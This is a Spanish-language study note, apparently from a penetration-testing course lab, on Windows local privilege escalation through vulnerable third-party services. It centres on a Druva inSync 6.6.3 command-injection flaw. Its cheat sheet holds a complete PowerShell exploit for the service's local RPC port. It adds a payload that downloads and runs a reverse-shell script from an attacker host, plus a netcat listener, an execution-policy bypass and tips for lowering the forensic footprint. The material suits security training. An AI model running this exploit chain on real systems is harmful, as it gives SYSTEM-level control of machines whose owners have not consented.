---
tags:
  - windows
  - privex
---
## Conceptos Clave (TL;DR)

- En entornos bien parcheados, la vía de escalada suele venir de software de terceros instalado (backup, monitorización, AV, etc.) que corre como `NT AUTHORITY\SYSTEM` y expone un servicio local (RPC, socket TCP) sin autenticación adecuada.
- El vector clásico: un servicio escucha en un puerto local (127.0.0.1), un proceso con privilegios SYSTEM atiende ese puerto, y existe un exploit PoC público (command injection) que permite enviar comandos arbitrarios al servicio.
- Metodología general: enumerar software instalado -> identificar versiones vulnerables -> correlacionar con puertos locales en escucha -> mapear puerto a PID -> mapear PID a proceso/servicio -> ejecutar/adaptar el exploit PoC.
- Caso concreto: Druva inSync v6.6.3 corre un servicio (`inSyncCPHService` / proceso `inSyncCPHwnet64`) en el puerto local 6064, vulnerable a inyección de comandos vía un protocolo RPC propietario ("inSync PHC RPCW[v0002]"), permitiendo ejecutar `cmd.exe` como SYSTEM.

## Herramientas Clave

- **wmic** – Enumerar software instalado en el sistema objetivo.
- **netstat** – Identificar puertos locales en escucha y su PID asociado.
- **Get-Process (PowerShell)** – Mapear PID a nombre de proceso.
- **Get-Service (PowerShell)** – Confirmar nombre del servicio y su estado (Running/Stopped).
- **Exploit PoC en PowerShell (socket TCP manual)** – Construye y envía el paquete RPC malicioso al servicio vulnerable (Druva inSync) para inyectar comandos.
- **Invoke-PowerShellTcp.ps1 (Nishang)** – Script de reverse shell en PowerShell, ejecutado en memoria.
- **python3 -m http.server** – Servidor web simple para alojar el script de reverse shell y que la víctima lo descargue.
- **netcat (nc)** – Listener en la máquina atacante para capturar la shell inversa.

## Metodología Paso a Paso

1. **Enumerar aplicaciones instaladas**
   Listar software de terceros instalado en el host. El objetivo es detectar aplicaciones no estándar (backup, monitorización, agentes corporativos) que puedan tener vulnerabilidades conocidas (buscar versión exacta en Google/Exploit-DB).

2. **Enumerar puertos locales en escucha**
   Una vez identificada una aplicación sospechosa, confirmar si tiene un servicio escuchando localmente (suele ser en 127.0.0.1, no expuesto a la red). Esto valida que el servicio vulnerable está activo y accesible desde el propio host.

3. **Mapear el puerto al PID**
   El output de `netstat` da el PID del proceso que escucha en el puerto. Esto confirma qué proceso es responsable del servicio.

4. **Mapear el PID al proceso y al servicio**
   Usar `Get-Process` para obtener el nombre del binario, y `Get-Service` para confirmar el nombre del servicio de Windows y que corre bajo una cuenta privilegiada (SYSTEM). Esto da certeza total de que estamos atacando el servicio correcto.

5. **Obtener y adaptar el exploit PoC**
   Buscar el PoC público para la versión identificada. Modificar la variable de comando ($cmd) del exploit. Evitar crear usuarios locales (ruidoso) y preferir una reverse shell en memoria.

6. **Preparar la infraestructura de exfiltración/shell**
   - Descargar y renombrar el script de reverse shell (ej. `Invoke-PowerShellTcp.ps1` -> `shell.ps1`).
   - Añadir al final del script la invocación con IP/puerto del atacante.
   - Levantar un servidor HTTP en el directorio del script.
   - Levantar un listener netcat en el puerto correspondiente.

7. **Ejecutar el exploit en el host objetivo**
   Bypassear la Execution Policy si es necesario, ejecutar el script PoC modificado (que se conecta al servicio local vulnerable e inyecta el comando para descargar/ejecutar la reverse shell). El servicio, corriendo como SYSTEM, ejecuta el comando inyectado.

8. **Validar la shell obtenida**
   Confirmar privilegios con `whoami` / `hostname` en la shell recibida.

## Cheat Sheet de Comandos

```cmd
:: Enumerar todo el software instalado en el sistema (puede ser lento)
C:\htb> wmic product get name
```

```cmd
:: Buscar conexiones/listeners en un puerto local especifico
:: -a muestra todas las conexiones y puertos en escucha
:: -n muestra direcciones y numeros de puerto en formato numerico
:: -o muestra el PID asociado a cada conexion
C:\htb> netstat -ano | findstr <PORT>
```

```powershell
# Mapear un PID a su proceso correspondiente
PS C:\htb> get-process -Id <PID>
```

```powershell
# Buscar servicios de Windows cuyo DisplayName coincida con un patron
# -like permite usar wildcards (*) para busqueda parcial
PS C:\htb> get-service | ? {$_.DisplayName -like '<APP_NAME_PATTERN>*'}
```

```powershell
# === PoC de PowerShell para Druva inSync (Command Injection via RPC local) ===
# Detiene la ejecucion ante cualquier error para evitar fallos silenciosos
$ErrorActionPreference = "Stop"

# Comando que se ejecutara como SYSTEM en el host objetivo
# Reemplazar por el comando deseado (ver variante de reverse shell abajo)
$cmd = "<COMMAND_TO_EXECUTE>"

# Crea un socket TCP raw para hablar directamente con el servicio RPC local
$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)

# Conexion al servicio vulnerable, SIEMPRE en localhost, puerto 6064
$s.Connect("127.0.0.1", 6064)

# Cabecera del protocolo propietario que identifica la version del RPC de inSync
$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")

# Tipo de operacion RPC (byte 0x05 + padding) requerido por el protocolo
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")

# Payload: invoca cmd.exe via path traversal (../../..) desde el directorio
# de la app para escapar de cualquier restriccion de directorio del servicio,
# y ejecuta el comando definido en $cmd
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");

# Longitud del payload, requerida por el protocolo antes de enviar el comando
$length = [System.BitConverter]::GetBytes($command.Length);

# Envio secuencial de los componentes del paquete RPC
$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

```powershell
# Variante de $cmd para reverse shell en memoria (sin tocar disco, menos ruidosa
# que crear un usuario local). Descarga y ejecuta el script de reverse shell
# alojado en el servidor web del atacante
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://<ATTACKER_IP>:8080/shell.ps1')"
```

```powershell
# Linea a añadir al final de Invoke-PowerShellTcp.ps1 (Nishang) antes de subirlo
# -Reverse indica conexion saliente desde la victima hacia el atacante
Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER_IP> -Port <LISTENER_PORT>
```

```bash
# Servidor web en la maquina atacante, en el mismo directorio donde esta shell.ps1
# Sirve el script para que la victima lo descargue via IEX/downloadString
python3 -m http.server 8080
```

```bash
# Listener Netcat en la maquina atacante para capturar la reverse shell
# -l = listen, -v = verbose, -n = no resolucion DNS, -p = puerto especifico
nc -lvnp <LISTENER_PORT>
```

```powershell
# Bypass de la Execution Policy en el host victima (solo para el proceso actual)
# necesario para poder ejecutar el script PoC .ps1 sin restricciones
Set-ExecutionPolicy Bypass -Scope Process
```

```powershell
# Validacion de privilegios tras obtener la shell
PS C:\WINDOWS\system32> whoami
PS C:\WINDOWS\system32> hostname
```

## "Gotchas" y Troubleshooting

- El servicio vulnerable de Druva inSync escucha únicamente en `127.0.0.1:6064` (loopback), por lo que el exploit debe ejecutarse localmente desde el host comprometido, no de forma remota.
- El nombre del proceso es `inSyncCPHwnet64` y el nombre del servicio de Windows es `inSyncCPHService` (DisplayName: "Druva inSync Client Service") — útil para fingerprinting rápido con `Get-Service`/`Get-Process` sin depender solo de `wmic`.
- La vulnerabilidad depende de la versión exacta del software (en este caso 6.6.3); siempre verificar versión instalada antes de asumir que el exploit aplica.
- Crear un usuario administrador local vía `net user /add` es una opción del PoC, pero es ruidosa y modifica el estado del sistema — preferir una reverse shell en memoria para minimizar el impacto/huella forense.
- El payload usa path traversal (`..\..\..`) desde el directorio de instalación de la app para invocar `cmd.exe` de System32; si la ruta de instalación cambia entre versiones, hay que ajustar el número de niveles de traversal.
- Antes de ejecutar el script PoC descargado/modificado, puede ser necesario un bypass de Execution Policy (`Set-ExecutionPolicy Bypass -Scope Process`) para que PowerShell permita su ejecución.
- `wmic product get name` puede ser lento y, en builds recientes de Windows, `wmic` está deprecado/ausente — si falla, considerar alternativas como `Get-WmiObject`, `Get-Package`, o revisar el registro de programas instalados.
- Tras la explotación, la shell resultante corre en el contexto del equipo (`WINLPE-WS01$`) pero con privilegios de `NT AUTHORITY\SYSTEM`, confirmando la escalada exitosa.